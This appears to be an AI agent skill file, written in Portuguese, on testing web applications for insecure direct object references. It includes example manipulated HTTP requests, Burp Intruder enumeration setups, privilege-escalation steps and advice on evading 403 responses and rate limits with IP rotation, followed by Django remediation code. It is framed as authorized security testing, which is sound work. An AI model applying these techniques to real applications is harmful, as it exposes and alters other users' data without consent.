---
name: IDOR Vulnerability Testing
description: Esta skill deve ser usada quando o usuário pede para "testar referências diretas inseguras a objetos," "encontrar vulnerabilidades IDOR," "explorar controle de acesso quebrado," "enumerar IDs de usuário ou referências de objetos," ou "contornar autorização para acessar dados de outros usuários." Fornece orientação abrangente para detectar, explorar e remediar vulnerabilidades IDOR em aplicações web.
metadata:
  author: zebbern
  version: "1.1"
---

# IDOR Vulnerability Testing

## Purpose

Fornecer metodologias sistemáticas para identificar e explorar vulnerabilidades de Insecure Direct Object Reference (IDOR) em aplicações web. Esta skill abrange referências a objetos de banco de dados e referências a arquivos estáticos, técnicas de detecção usando manipulação de parâmetros e enumeração, exploração via Burp Suite e estratégias de remediação para proteger aplicações contra acesso não autorizado.

## Inputs / Prerequisites

- **Target Web Application**: URL da aplicação com recursos específicos do usuário
- **Multiple User Accounts**: No mínimo duas contas de teste para verificar acesso entre usuários
- **Burp Suite or Proxy Tool**: Proxy interceptador para manipulação de requisições
- **Authorization**: Permissão escrita para teste de segurança
- **Understanding of Application Flow**: Conhecimento de como objetos são referenciados (IDs, nomes de arquivo)

## Outputs / Deliverables

- **IDOR Vulnerability Report**: Documentação de bypasses de controle de acesso descobertos
- **Proof of Concept**: Evidência de acesso não autorizado a dados em contextos de usuário diferentes
- **Affected Endpoints**: Lista de endpoints de API vulneráveis e parâmetros afetados
- **Impact Assessment**: Classificação da severidade de exposição de dados
- **Remediation Recommendations**: Correções específicas para vulnerabilidades identificadas

## Core Workflow

### 1. Understand IDOR Vulnerability Types

#### Direct Reference to Database Objects
Ocorre quando aplicações referenciam registros de banco de dados via parâmetros controláveis pelo usuário:
```
# Original URL (autenticado como Usuário A)
example.com/user/profile?id=2023

# Tentativa de manipulação (acessando dados do Usuário B)
example.com/user/profile?id=2022
```

#### Direct Reference to Static Files
Ocorre quando aplicações expõem caminhos ou nomes de arquivo que podem ser enumerados:
```
# Original URL (recibo do Usuário A)
example.com/static/receipt/205.pdf

# Tentativa de manipulação (recibo do Usuário B)
example.com/static/receipt/200.pdf
```

### 2. Reconnaissance and Setup

#### Create Multiple Test Accounts
```
Account 1: "attacker" - Conta de teste principal
Account 2: "victim" - Conta cujos dados tentamos acessar
```

#### Identify Object References
Capturar e analisar requisições contendo:
- IDs numéricos em URLs: `/api/user/123`
- IDs numéricos em parâmetros: `?id=123&action=view`
- IDs numéricos no corpo da requisição: `{"userId": 123}`
- Caminhos de arquivo: `/download/receipt_123.pdf`
- GUIDs/UUIDs: `/profile/a1b2c3d4-e5f6-...`

#### Map User IDs
```
# Acessar endpoint de ID do usuário (se disponível)
GET /api/user-id/

# Notar padrões de ID:
# - Números sequenciais (1, 2, 3...)
# - Valores auto-incrementados
# - Padrões previsíveis
```

### 3. Detection Techniques

#### URL Parameter Manipulation
```
# Passo 1: Capturar requisição autenticada original
GET /api/user/profile?id=1001 HTTP/1.1
Cookie: session=attacker_session

# Passo 2: Modificar ID para alvo de outro usuário
GET /api/user/profile?id=1000 HTTP/1.1
Cookie: session=attacker_session

# Vulnerável se: Retorna dados da vítima com sessão do atacante
```

#### Request Body Manipulation
```
# Requisição POST original
POST /api/address/update HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{"id": 5, "userId": 1001, "address": "123 Attacker St"}

# Requisição modificada atacando a vítima
{"id": 5, "userId": 1000, "address": "123 Attacker St"}
```

#### HTTP Method Switching
```
# Requisição GET original pode estar protegida
GET /api/admin/users/1000 → 403 Forbidden

# Tentar métodos alternativos
POST /api/admin/users/1000 → 200 OK (Vulnerável!)
PUT /api/admin/users/1000 → 200 OK (Vulnerável!)
```

### 4. Exploitation with Burp Suite

#### Manual Exploitation
```
1. Configurar proxy do navegador através do Burp Suite
2. Fazer login como usuário "attacker"
3. Navegar para página de perfil/dados
4. Ativar Intercept na aba Proxy
5. Capturar requisição com ID do usuário
6. Modificar ID para ID da vítima
7. Encaminhar requisição
8. Observar resposta para dados da vítima
```

#### Automated Enumeration with Intruder
```
1. Enviar requisição para Intruder (Ctrl+I)
2. Limpar todas as posições de payload
3. Selecionar parâmetro ID como posição de payload
4. Configurar tipo de ataque: Sniper
5. Configurações de payload:
   - Tipo: Numbers
   - Intervalo: 1 a 10000
   - Passo: 1
6. Iniciar ataque
7. Analisar respostas para códigos de status 200
```

#### Battering Ram Attack for Multiple Positions
```
# Quando mesmo ID aparece em múltiplos locais
PUT /api/addresses/§5§/update HTTP/1.1

{"id": §5§, "userId": 3}

Attack Type: Battering Ram
Payload: Numbers 1-1000
```

### 5. Common IDOR Locations

#### API Endpoints
```
/api/user/{id}
/api/profile/{id}
/api/order/{id}
/api/invoice/{id}
/api/document/{id}
/api/message/{id}
/api/address/{id}/update
/api/address/{id}/delete
```

#### File Downloads
```
/download/invoice_{id}.pdf
/static/receipts/{id}.pdf
/uploads/documents/{filename}
/files/reports/report_{date}_{id}.xlsx
```

#### Query Parameters
```
?userId=123
?orderId=456
?documentId=789
?file=report_123.pdf
?account=user@email.com
```

## Quick Reference

### IDOR Testing Checklist

| Test | Method | Indicator of Vulnerability |
|------|--------|---------------------------|
| Increment/Decrement ID | Alterar `id=5` para `id=4` | Retorna dados de outro usuário |
| Use Victim's ID | Substituir por ID conhecido da vítima | Acesso concedido aos recursos da vítima |
| Enumerate Range | Testar IDs 1-1000 | Encontrar registros válidos de outros usuários |
| Negative Values | Testar `id=-1` ou `id=0` | Dados inesperados ou erros |
| Large Values | Testar `id=99999999` | Divulgação de informações do sistema |
| String IDs | Alterar formato `id=user_123` | Bypass de lógica |
| GUID Manipulation | Modificar porções de UUID | Padrões de UUID previsíveis |

### Response Analysis

| Status Code | Interpretation |
|-------------|----------------|
| 200 OK | Possível IDOR - verificar propriedade dos dados |
| 403 Forbidden | Controle de acesso funcionando |
| 404 Not Found | Recurso não existe |
| 401 Unauthorized | Autenticação necessária |
| 500 Error | Possível problema de validação de entrada |

### Common Vulnerable Parameters

| Parameter Type | Examples |
|----------------|----------|
| User identifiers | `userId`, `uid`, `user_id`, `account` |
| Resource identifiers | `id`, `pid`, `docId`, `fileId` |
| Order/Transaction | `orderId`, `transactionId`, `invoiceId` |
| Message/Communication | `messageId`, `threadId`, `chatId` |
| File references | `filename`, `file`, `document`, `path` |

## Constraints and Limitations

### Operational Boundaries
- Requer no mínimo duas contas de usuário válidas para verificação
- Algumas aplicações usam tokens vinculados a sessão em vez de IDs
- Referências GUID/UUID mais difíceis de enumerar, mas não impossível
- Rate limiting pode restringir tentativas de enumeração
- Alguns IDOR requerem vulnerabilidades em cadeia para explorar

### Detection Challenges
- Escalação de privilégio horizontal (usuário-para-usuário) vs vertical (usuário-para-admin)
- IDOR cego onde resposta não confirma acesso
- IDOR baseado em tempo em operações assincronamente
- IDOR em comunicações WebSocket

### Legal Requirements
- Testar apenas aplicações com autorização explícita
- Documentar todas as atividades e descobertas de teste
- Não acessar, modificar ou exfiltrar dados reais de usuários
- Relatar descobertas através dos canais apropriados de divulgação

## Examples

### Example 1: Basic ID Parameter IDOR
```
# Login como atacante (userId=1001)
# Navegar para página de perfil

# Requisição original
GET /api/profile?id=1001 HTTP/1.1
Cookie: session=abc123

# Resposta: Dados de perfil do atacante

# Requisição modificada (alvo userId da vítima=1000)
GET /api/profile?id=1000 HTTP/1.1
Cookie: session=abc123

# Resposta Vulnerável: Dados de perfil da vítima retornados!
```

### Example 2: IDOR in Address Update Endpoint
```
# Interceptar requisição de atualização de endereço
PUT /api/addresses/5/update HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{
  "id": 5,
  "userId": 1001,
  "street": "123 Main St",
  "city": "Test City"
}

# Modificar userId para ID da vítima
{
  "id": 5,
  "userId": 1000,  # Alterado de 1001
  "street": "Hacked Address",
  "city": "Exploit City"
}

# Se 200 OK: Endereço criado sob conta da vítima
```

### Example 3: Static File IDOR
```
# Baixar próprio recibo
GET /api/download/5 HTTP/1.1
Cookie: session=attacker_session

# Resposta: PDF do recibo do atacante (pedido #5)

# Tentar acessar outros recibos
GET /api/download/3 HTTP/1.1
Cookie: session=attacker_session

# Resposta Vulnerável: PDF do recibo da vítima (pedido #3)!
```

### Example 4: Burp Intruder Enumeration
```
# Configurar ataque Intruder
Target: PUT /api/addresses/§1§/update
Payload Position: Address ID na URL e corpo

Attack Configuration:
- Type: Battering Ram
- Payload: Numbers 0-20, Step 1

Body Template:
{
  "id": §1§,
  "userId": 3
}

# Analisar resultados:
# - Respostas 200 indicam modificação bem-sucedida
# - Verificar conta da vítima para novos endereços
```

### Example 5: Horizontal to Vertical Escalation
```
# Passo 1: Enumerar funções de usuário
GET /api/user/1 → {"role": "user", "id": 1}
GET /api/user/2 → {"role": "user", "id": 2}
GET /api/user/3 → {"role": "admin", "id": 3}

# Passo 2: Acessar funções de admin com ID descoberto
GET /api/admin/dashboard?userId=3 HTTP/1.1
Cookie: session=regular_user_session

# Se acessível: Escalação de privilégio vertical alcançada
```

## Troubleshooting

### Issue: All Requests Return 403 Forbidden
**Cause**: Controle de acesso servidor está implementado
**Solution**:
```
# Tentar vetores de ataque alternativos:
1. Alternância de método HTTP (GET → POST → PUT)
2. Adicionar headers X-Original-URL ou X-Rewrite-URL
3. Tentar poluição de parâmetro: ?id=1001&id=1000
4. Variações de codificação de URL: %31%30%30%30 para "1000"
5. Variações de maiúscula/minúscula para IDs em string
```

### Issue: Application Uses UUIDs Instead of Sequential IDs
**Cause**: Identificadores aleatorizados reduzem risco de enumeração
**Solution**:
```
# Técnicas de descoberta de UUID:
1. Verificar corpos de resposta para UUIDs vazados
2. Procurar em arquivos JavaScript por UUIDs hardcoded
3. Verificar respostas de API que listam múltiplos objetos
4. Procurar por padrões UUID em mensagens de erro
5. Tentar predição UUID v1 (baseado em tempo) se aplicável
```

### Issue: Session Token Bound to User
**Cause**: Aplicação valida sessão contra recurso solicitado
**Solution**:
```
# Tentativas de bypass avançado:
1. Testar IDOR em endpoints não autenticados
2. Verificar fluxos de reset de senha/verificação de email
3. Procurar IDOR em upload/download de arquivo
4. Testar versionamento de API: /api/v1/ vs /api/v2/
5. Verificar endpoints de API móvel (frequentemente menos protegidos)
```

### Issue: Rate Limiting Blocks Enumeration
**Cause**: Aplicação implementa throttling de requisição
**Solution**:
```
# Técnicas de bypass:
1. Adicionar delays entre requisições (Burp Intruder throttle)
2. Girar endereços IP (cadeias de proxy)
3. Alvo de IDs específicos de alto valor em vez de intervalo completo
4. Usar diferentes endpoints para mesmos recursos
5. Testar durante horas de pouco movimento
```

### Issue: Cannot Verify IDOR Impact
**Cause**: Resposta não indica claramente propriedade dos dados
**Solution**:
```
# Métodos de verificação:
1. Criar dados identificáveis únicos em conta da vítima
2. Procurar marcadores de PII (nome, email) em respostas
3. Comparar tamanhos de resposta entre usuários
4. Verificar diferenças de tempo em respostas
5. Usar indicadores secundários (datas de criação, metadados)
```

## Remediation Guidance

### Implement Proper Access Control
```python
# Exemplo Django - validar propriedade
def update_address(request, address_id):
    address = Address.objects.get(id=address_id)
    
    # Verificar propriedade antes de permitir atualização
    if address.user != request.user:
        return HttpResponseForbidden("Unauthorized")
    
    # Prosseguir com atualização
    address.update(request.data)
```

### Use Indirect References
```python
# Em vez de: /api/address/123
# Usar: /api/address/current-user/billing

def get_address(request):
    # Sempre filtrar por usuário autenticado
    address = Address.objects.filter(user=request.user).first()
    return address
```

### Server-Side Validation
```python
# Sempre validar no servidor, nunca confiar em entrada do cliente
def download_receipt(request, receipt_id):
    receipt = Receipt.objects.filter(
        id=receipt_id,
        user=request.user  # Crítico: filtrar por usuário atual
    ).first()
    
    if not receipt:
        return HttpResponseNotFound()
    
    return FileResponse(receipt.file)
```